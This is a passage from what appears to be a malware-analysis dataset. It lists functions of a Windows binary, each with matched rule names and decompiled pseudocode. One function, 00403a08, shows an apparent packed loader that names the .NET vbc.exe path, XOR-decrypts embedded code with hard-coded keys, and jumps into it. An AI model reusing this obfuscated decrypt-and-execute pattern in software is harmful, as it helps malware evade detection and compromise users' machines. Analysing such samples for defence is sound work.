1 < 0x1000) || (iVar2 = *(iStack64 + -4),  (iStack64 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043205d;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00432104:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00432110:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 821
    },
    "004036ca": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004036ca(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    uint32_t in_stack_ffffff2c;\n    uint32_t in_stack_ffffff44;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x44ca00;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 9;\n    pcStack136 = \"pmellurmhruewqfnkdw\";\n    auStack144[0] = 0x13;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x21, iStack60, \"zjlnzftwwxeznkvdswjilznoppqjaleey\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x13, uStack84, \"pmellurmhruewqfnkdw\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xe;\n    fcn.00402f72(0x13, uStack36, \"pmellurmhruewqfnkdw\");\n    if (uStack64 < 0x10) {\ncode_r0x0043d60e:\n        if (0xf < uStack40) {\n            in_stack_ffffff44 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff44) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x0043d90e;\n                in_stack_ffffff44 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x13, in_stack_ffffff44 & 0xffffff00 | uStack84 & 0xff, \"pmellurmhruewqfnkdw\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xd;\n        fcn.00402f72(0x13, uStack36, \"pmellurmhruewqfnkdw\");\n        if (0xf < uStack64) {\n            in_stack_ffffff2c = uStack64 + 1;\n            uVar2 = uStack84;\n            if (0xfff < in_stack_ffffff2c) {\n                uVar2 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar2) goto code_r0x0043d91a;\n                in_stack_ffffff2c = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff2c = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff2c) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x0043d926;\n                in_stack_ffffff2c = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x21, in_stack_ffffff2c & 0xffffff00 | uStack84 & 0xff, \"zjlnzftwwxeznkvdswjilznoppqjaleey\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xc;\n        fcn.00402f72(0x21, uStack36, \"zjlnzftwwxeznkvdswjilznoppqjaleey\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x0043d932;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x0043d93e;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x0043d94a;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack112) {\n            iVar3 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar3 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar3))\n            goto code_r0x0043d956;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar3 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar3 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar3)) goto code_r0x0043d962;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0xb5dd;\n    }\n    in_stack_ffffff44 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff44 < 0x1000) {\ncode_r0x0043d602:\n        fcn.00401a32(uVar2);\n        goto code_r0x0043d60e;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff44 = uStack64 + 0x24;\n        goto code_r0x0043d602;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043d90e:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043d91a:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043d926:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0043d932:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0043d93e:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0043d94a:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0043d956:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x0043d962:\n    uStack20 = 8;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 2190
    },
    "00403715": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00403715(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x4149a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"bxcoommvuarehhgrxmhvqzjlqtesvxqluseywmhxxmxakzuouhcizggmmgqhelwxjngtshofwanyywdo\";\n    auStack120[0] = 0x50;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x36, iStack84, \"ojrussiqrnqwthjgrajkgwsukkzvqtwokfxzvtculpgmgsthwtguvw\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x4e, uStack36, \"dikolqgzzxoyxexgbimdcroqsrlcdrmibltgltdrnjatwwvusesehddmbpottgestmlgoumgrjrvme\");\n    if (uStack64 < 0x10) {\ncode_r0x00411da3:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00411e33;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00411e3f;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0xea84;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00411da3;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00411e33:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00411e3f:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 903
    },
    "0040375b": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.0040375b(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    uint auStack48 [2];\n    char *pcStack40;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack48;\n    uStack24 = 0x44c7f0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    *param_1 = 0;\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    *param_1 = 0;\n    uStack20 = 1;\n    pcStack40 = \"crtwevylrdjrvozsr\";\n    auStack48[0] = 0x11;\n    fcn.00402f72();\n    if (0xf < in_stack_00000034) {\n        arg_8h = in_stack_00000020;\n        if ((0xfff < in_stack_00000034 + 1) &&\n           (arg_8h = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            puVar1 = fcn.00403a76();\n            return puVar1;\n        }\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 406
    },
    "00403805": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00403805(uint param_1, int32_t param_2)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 in_ST0;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    int32_t in_stack_00000050;\n    uint32_t in_stack_00000064;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c2f0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_0000001c < 0x10) {\ncode_r0x00428088:\n        ppuStack32 = ppuVar1;\n        if (0xf < in_stack_00000038) {\n            iVar2 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar2 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar2)) goto code_r0x00428133;\n            in_ST0 = fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000064) {\n            iVar2 = in_stack_00000050;\n            if ((0xfff < in_stack_00000064 + 1) &&\n               (iVar2 = *(in_stack_00000050 + -4),  0x1f < (in_stack_00000050 + -4) - iVar2)) goto code_r0x0042813f;\n            in_ST0 = fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return in_ST0;\n    }\n    iVar2 = param_2;\n    if ((in_stack_0000001c + 1 < 0x1000) || (iVar2 = *(param_2 + -4),  (param_2 + -4) - iVar2 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        in_ST0 = fcn.00401a32(iVar2);\n        ppuVar1 = ppuStack32;\n        goto code_r0x00428088;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00428133:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042813f:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    return *0x5420d8;\n}\n",
        "token_count": 693
    },
    "004038f0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.004038f0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack24 = 0x44ca30;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    pcStack88 = \"tavyddvcxymgmogchyilrsqxwmgxoysuhpatnpxuvwqtzuqcpnsnugiiwihbiakgqrznamxxdqafpnxujb\";\n    auStack96[0] = 0x52;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x5d, uStack36, \n                 \"sqoifmwofpmuzhydfhaydobjyzlpslihgrlwlzfpbljevjvjenljngykcguobphljlfluwcruvzdzfxwyvuiwslykoioz\");\n    if (uStack40 < 0x10) {\ncode_r0x0043dfa9:\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x0043e03b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar2 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar2 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar2)) goto code_r0x0043e047;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iVar2 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(iStack60 + -4),  (iStack60 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043dfa9;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043e03b:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043e047:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 835
    },
    "004039d6": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.004039d6(void)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000010;\n    uint32_t in_stack_00000024;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    int32_t in_stack_00000048;\n    uint32_t in_stack_0000005c;\n    int32_t in_stack_00000060;\n    uint32_t in_stack_00000074;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cd00;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000024 < 0x10) {\ncode_r0x00446938:\n        ppuStack32 = ppuVar1;\n        if (0xf < in_stack_0000003c) {\n            iVar2 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (iVar2 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar2)) goto code_r0x00446a31;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000005c) {\n            iVar2 = in_stack_00000048;\n            if ((0xfff < in_stack_0000005c + 1) &&\n               (iVar2 = *(in_stack_00000048 + -4),  0x1f < (in_stack_00000048 + -4) - iVar2)) goto code_r0x00446a3d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000074) {\n            iVar2 = in_stack_00000060;\n            if ((0xfff < in_stack_00000074 + 1) &&\n               (iVar2 = *(in_stack_00000060 + -4),  0x1f < (in_stack_00000060 + -4) - iVar2)) goto code_r0x00446a49;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar2 = in_stack_00000010;\n    if ((in_stack_00000024 + 1 < 0x1000) ||\n       (iVar2 = *(in_stack_00000010 + -4),  (in_stack_00000010 + -4) - iVar2 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iVar2);\n        ppuVar1 = ppuStack32;\n        goto code_r0x00446938;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00446a31:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00446a3d:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00446a49:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    return;\n}\n",
        "token_count": 841
    },
    "00403a08": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00403a08(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint32_t uVar4;\n    uint unaff_EDI;\n    uint32_t *in_FS_OFFSET;\n    bool bVar5;\n    float10 fVar6;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    int32_t in_stack_00000048;\n    uint32_t in_stack_0000005c;\n    uint8_t auStackY291416 [291328];\n    uchar *puStackY88;\n    uint uStackY80;\n    uint uStackY76;\n    uint uStackY72;\n    uchar *puStackY68;\n    uchar *puStackY64;\n    int32_t iVar7;\n    int32_t noname_3;\n    uint32_t noname_4;\n    uint32_t noname_6;\n    uint noname_7;\n    uint32_t uVar8;\n    char *noname_9;\n    uint noname_10;\n    \n    fcn.00401db1();\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)();\n    uVar8 = 0x4ea555;\n    fcn.0040576d();\n    iVar7 = 0;\n    noname_4 = 0xf;\n    puStackY64 = NULL;\n    uVar8 = uVar8 & 0xffffff00 | puStackY88 & 0xff;\n    noname_9 = \"C:\\\\Windows\\\\Microsoft.NET\\\\Fra\";\n    noname_7 = 0x1c;\n    fcn.00402f72();\n    if (noname_4 - iVar7 < 0x19) {\n        noname_4 = noname_4 & 0xffffff00 | puStackY88;\n        noname_3 = 0x19;\n        fcn.00405547();\n    }\n    else {\n        noname_3 = iVar7 + 0x19;\n        puVar3 = &stack0xffffffc0;\n        if (0xf < noname_4) {\n            puVar3 = puStackY64;\n        }\n        puVar1 = puVar3 + iVar7 + 9;\n        *puVar1 = CONCAT13(str.mework_v4.0.30319_vbc.exe[12], str.mework_v4.0.30319_vbc.exe._9_3_);\n        puVar1[1] = CONCAT13(str.mework_v4.0.30319_vbc.exe[16], str.mework_v4.0.30319_vbc.exe._13_3_);\n        puVar1[2] = str.mework_v4.0.30319_vbc.exe._17_4_;\n        puVar1[3] = str.mework_v4.0.30319_vbc.exe._21_4_;\n        puVar1 = puVar3 + iVar7;\n        *puVar1 = str.mework_v4.0.30319_vbc.exe._0_4_;\n        puVar1[1] = str.mework_v4.0.30319_vbc.exe._4_4_;\n        puVar1[2] = str.mework_v4.0.30319_vbc.exe._8_4_;\n        puVar1[3] = str.mework_v4.0.30319_vbc.exe._12_4_;\n        puVar3[iVar7 + 0x19] = 0;\n    }\n    noname_10 = 6;\n    puStackY64 = NULL;\n    uStackY72 = 0;\n    uStackY76 = 0;\n    uStackY80 = 0x8f7a6;\n    puStackY88 = 0x74d85d;\n    fcn.004058cb();\n    uVar4 = 0;\n    do {\n        noname_6 = uVar4;\n        (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)();\n        iVar2 = \"ryy6u9x6qFf1C9uGzZEZkL3R2oUz70wsSsoAV0SdpRDX5LnDCSYJVmbBNaTDU8zJRd9JzfitobkgSj4pKJ0xNX8w67\"\n                [noname_6 % 0x5b >> 2] * 0xac0 * 0x81848da9;\n        *(noname_6 + 0x56c000) = *(noname_6 + 0x56c000) ^ ((iVar2 >> 0x29) - (iVar2 >> 0x3f)) * '\\v';\n        uVar4 = noname_6 + 1;\n    } while (uVar4 != 0x77e);\n    puVar3 = &stack0xffffffa8;\n    puStackY64 = 0x40cd27;\n    fcn.00403904(puVar3, &stack0xffffffc0, 1, noname_3, noname_4, puVar3, noname_6, noname_7, uVar8, noname_9, noname_10\n                 , unaff_ESI, unaff_EDI, unaff_EBX);\n    bVar5 = 7 < puStackY68;\n    puStackY68 = puVar3;\n    if (bVar5) {\n        puStackY68 = puStackY88;\n    }\n    uVar4 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)();\n        iVar2 = \"R2v9qXwKNhgOu2jYnbWZHRLs9JJL1m28QX7SBLxXtJeCn50LeRQKsCiKaBAjdr8lh4u5AKXJEg97bHgjgKyLkBLQHK\"\n                [uVar4 % 0x5b >> 2] * 0xac0 * 0x81848da9;\n        (&stack0xfffb8da8)[uVar4] = (&stack0xfffb8da8)[uVar4] ^ ((iVar2 >> 0x29) - (iVar2 >> 0x3f)) * '\\v';\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 0x47200);\n    puStackY64 = NULL;\n    uStackY72 = 0x40cdc8;\n    func_0x0056c181();\n    if (puStackY68 < 0x8) {\ncode_r0x0040ce0b:\n        if (0xf < noname_4) {\n            iVar7 = puStackY64;\n            if ((0xfff < noname_4 + 1) && (iVar7 = *(puStackY64 + -4),  0x1f < (puStackY64 + -4) - iVar7))\n            goto code_r0x0040cf35;\n            fcn.00401a32(iVar7);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar7 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar7 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar7))\n            goto code_r0x0040cf41;\n            fcn.00401a32(iVar7);\n        }\n        if (0xf < in_stack_0000003c) {\n            iVar7 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (iVar7 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar7)) goto code_r0x0040cf4d;\n            fcn.00401a32(iVar7);\n        }\n        if (0xf < in_stack_0000005c) {\n            iVar7 = in_stack_00000048;\n            if ((0xfff < in_stack_0000005c + 1) &&\n               (iVar7 = *(in_stack_00000048 + -4),  0x1f < (in_stack_00000048 + -4) - iVar7)) goto code_r0x0040cf59;\n            fcn.00401a32(iVar7);\n        }\n        *in_FS_OFFSET = uVar8;\n        return 0;\n    }\n    puVar3 = puStackY88;\n    if ((puStackY68 * 2 + 2U < 0x1000) || (puVar3 = *(puStackY88 + -4),  puStackY88 + (-4 - puVar3) < 0x20)) {\n        fcn.00401a32(puVar3);\n        goto code_r0x0040ce0b;\n    }\n    fcn.004047f5();\ncode_r0x0040cf35:\n    fcn.004047f5();\ncode_r0x0040cf41:\n    fcn.004047f5();\ncode_r0x0040cf4d:\n    fcn.004047f5();\ncode_r0x0040cf59:\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar6 = fcn.004052a9();\n    return fVar6;\n}\n",
        "token_count": 2150
    },
    "0040671c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.0040671c(uint param_1, uint32_t param_2, uint param_3, uint32_t param_4, int32_t param_5, uint param_6, \n                      uint32_t param_7, uint param_8, uint32_t param_9, uint32_t param_10, uint param_11, uint param_12\n                      , uint param_13, uint32_t param_14, uint param_15, uchar *param_16)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    uchar *arg_8h;\n    int32_t unaff_EBP;\n    uint32_t unaff_EDI;\n    uint32_t uVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000054;\n    int32_t aiStack176 [4];\n    uint uStack160;\n    uint32_t uStack156;\n    int32_t iStack152;\n    uint uStack136;\n    uint32_t uStack132;\n    int32_t iStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    uchar uStack104;\n    int32_t *piStack100;\n    int32_t *piStack96;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint32_t uStack80;\n    int32_t iStack56;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack84 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c340;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uVar3 = unaff_EDI;\n    ppuVar1 = &ppuStack32;\n    if (param_7 < 0x10) {\ncode_r0x00428f38:\n        ppuStack32 = ppuVar1;\n        param_6 = 0;\n        param_7 = 0xf;\n        param_2 = param_2 & 0xffffff00;\n        if (0xf < param_14) {\n            uStack80 = param_9;\n            if ((0xfff < param_14 + 1) &&\n               (uStack80 = *(param_9 - 4),  uVar3 = uStack80,  0x1f < (param_9 - 4) - uStack80)) goto code_r0x00428fe3;\n            fcn.00401a32(uStack80);\n        }\n        param_13 = 0;\n        param_14 = 0xf;\n        param_9 = param_9 & 0xffffff00;\n        if (in_stack_00000054 < 0x10) {\ncode_r0x00428fc4:\n            *in_FS_OFFSET = piStack28;\n            return piStack28;\n        }\n        puStack84 = param_16;\n        if ((in_stack_00000054 + 1 < 0x1000) ||\n           (puStack84 = *(param_16 + -4),  uStack80 = uVar3,  param_16 + (-4 - puStack84) < 0x20)) {\n            fcn.00401a32(puStack84);\n            goto code_r0x00428fc4;\n        }\n    }\n    else {\n        uStack80 = param_2;\n        if ((param_7 + 1 < 0x1000) || (uStack80 = *(param_2 - 4),  uVar3 = uStack80,  (param_2 - 4) - uStack80 < 0x20))\n        {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack80);\n            ppuVar1 = ppuStack32;\n            goto code_r0x00428f38;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x00428fe3:\n        uStack20 = 1;\n        fcn.004047f5();\n    }\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    piStack100 = aiStack176;\n    uStack92 = 0x44c350;\n    piStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack96;\n    uStack160 = 0;\n    uStack156 = 0xf;\n    aiStack176[0] = 0;\n    uStack88 = 7;\n    fcn.00402f72(0x1b, iStack128, \"ovieqfbhiboqaxwhslkuwurlymu\");\n    uStack112 = 0;\n    uStack108 = 0xf;\n    iStack128 = 0;\n    uStack88 = 8;\n    fcn.00402f72(0x1b, iStack152, \"ovieqfbhiboqaxwhslkuwurlymu\");\n    uStack136 = 0;\n    uStack132 = 0xf;\n    iStack152 = 0;\n    uStack88 = 9;\n    fcn.00402f72(0x1b, uStack104, \"ovieqfbhiboqaxwhslkuwurlymu\");\n    if (uStack132 < 0x10) {\ncode_r0x00429158:\n        if 